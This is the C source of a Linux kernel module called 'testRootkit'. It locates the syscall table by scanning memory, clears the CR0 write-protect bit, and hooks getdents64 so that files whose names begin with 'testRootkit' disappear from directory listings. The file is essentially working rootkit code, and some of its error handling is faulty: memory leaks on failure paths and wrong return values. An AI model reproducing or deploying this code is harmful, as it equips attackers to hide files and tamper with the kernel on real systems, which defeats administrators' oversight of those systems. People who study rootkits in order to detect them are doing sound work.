#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <asm/fcntl.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fs_struct.h>
#include <linux/syscalls.h>
#include <linux/sched.h> 
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/init.h>

unsigned long **sys_call_table;

asmlinkage unsigned long (*orig_getdents64) (unsigned int fd,
                                    struct linux_dirent64 *dirent,
                                    unsigned int count);

/* all files starting with HIDE_FILE string will be hidden */
char HIDE_FILE[] = "testRootkit";

MODULE_LICENSE("GPL");

int rooty_init(void);
void rooty_exit(void);
asmlinkage unsigned long o_getdents64(unsigned int fd,
                            struct linux_dirent64 *dirent,
                            unsigned int count);
static unsigned long **find_sys_call_table(void);
static void disable_wp_protection(void);
static void enable_wp_protection(void);

module_init(rooty_init);
module_exit(rooty_exit);


int rooty_init(void) {

    printk("testRootkit: module loaded\n");

    if (!(sys_call_table = find_sys_call_table())) {
        printk("request sys_call_table failed!\n");
        return -1;
    }

    disable_wp_protection();
    orig_getdents64 = sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = o_getdents64;
    enable_wp_protection();

    printk("request sys_call_table success!\n");

    return 0;
}

void rooty_exit(void) {
    printk("rooty: module removed\n");

    disable_wp_protection();
    sys_call_table[__NR_getdents64] = orig_getdents64; /*set getdents64 syscall to the origal
    one */
    enable_wp_protection();
}

asmlinkage unsigned long o_getdents64(unsigned int fd, 
                            struct linux_dirent64 *dirent,
                            unsigned int count)
{
    unsigned int ret, temp;
    int hide_file=0;
    int failed_copy;
    struct linux_dirent64 *dirp, *curr_dirp;

    /* call original function */
    ret = (*orig_getdents64) (fd, dirent, count);
    if (!ret)
        return ret;

    /* allocate memory at kernel */
    dirp = (struct linux_dirent64*) kmalloc(ret, GFP_KERNEL);
    if (!dirp)
        return dirp;

    /* copy from userspace to kernelspace */
    failed_copy = copy_from_user(dirp, dirent, ret);
    if (failed_copy !=0 )
        return failed_copy;

    curr_dirp = dirp;
    temp = ret;

    while (temp > 0) {
        /* d_reclen is a member of struct linux_dirent64, it's size of current linux_dirent64*/
        temp -= curr_dirp->d_reclen;
        hide_file = 1;

        if( (strncmp(curr_dirp->d_name, HIDE_FILE, strlen(HIDE_FILE)) == 0)) {
            /* not allow to display the file */
            ret -= curr_dirp->d_reclen;
            hide_file = 0;

            /* overlapping the current dirp */
            if (temp) 
                memmove(curr_dirp, (char*) curr_dirp + curr_dirp->d_reclen, temp);
        }

        /* search for the next linux_dirent64 */
        if (temp && hide_file)
            curr_dirp = (struct linux_dirent64*) ((char *) curr_dirp + curr_dirp->d_reclen);
    }

    /* copy from kernelspace back to user */
    failed_copy = copy_to_user((void*) dirent, (void*) dirp, ret);
    if (failed_copy != 0)
        return failed_copy;
    kfree(dirp);
    
    return ret;    

}


unsigned long **find_sys_call_table(void)  { 

  unsigned long **syscalltable; 
  unsigned long ptr; 

  syscalltable = NULL; 
  
  for ( ptr = PAGE_OFFSET; ptr< ULONG_MAX; ptr+=sizeof(void *)) { 
    unsigned long *p; 
    p = (unsigned long *)ptr; 
    if (p[__NR_close] == (unsigned long) sys_close) { 
      syscalltable = (unsigned long **) p; 
      return syscalltable; 
    } 
    
  } 
  return NULL; 
} 

static void disable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));
    asm volatile ("mov %0, %%cr0"::"r" (value & ~0x00010000));
}

static void enable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));
    asm volatile ("mov %0, %%cr0"::"r" (value | 0x00010000));
}
